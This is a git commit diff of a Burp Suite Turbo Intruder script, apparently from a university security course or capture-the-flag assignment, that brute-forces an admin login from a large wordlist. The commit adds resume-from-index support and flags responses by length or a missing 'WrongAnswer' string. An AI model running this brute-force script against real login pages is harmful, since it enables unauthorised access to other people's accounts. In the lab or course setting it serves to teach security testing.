ab966cf0be2b730903c54c104adf7ec0d36e825b
Vaernion <vaporz@gmail.com>
2021-09-05 12:25:26 +0200

    burp turbo intruder script with pausing

--- assignment02/burp-bruteforce-admin.py
+++ assignment02/burp-bruteforce-admin.py
@@ -1,17 +1,28 @@
 def queueRequests(target, wordlists):
     engine = RequestEngine(
         endpoint=target.endpoint,
-        engine=Engine.BURP,
+        # engine=Engine.BURP,
         concurrentConnections=10,
-        requestsPerConnection=100,
+        requestsPerConnection=10,
         pipeline=False,
     )
 
-    for word in open("megalist_md5.txt"):
-        engine.queue(target.req, word)
+    continue_from = 0
+
+    for i, word in enumerate(open("S:/NTNU-large/TTM4536/megalist2.txt")):
+        if i < continue_from - 1:
+            continue
+        word_stripped = word.rstrip()
+        print(i, word_stripped)  # look in extension output when pausing
+        engine.queue(target.req, word_stripped)
 
 
 def handleResponse(req, interesting):
-    if interesting or "flag" in req.response.lower():
-        # if not "WrongAnswer" in req.response:
+    print(req.response)
+    # if interesting or not "WrongAnswer" in req.response or "flag" in req.response.lower():
+    if (
+        len(req.response) != 2742
+        or not "WrongAnswer" in req.response
+        or "flag" in req.response.lower()
+    ):
         table.add(req)
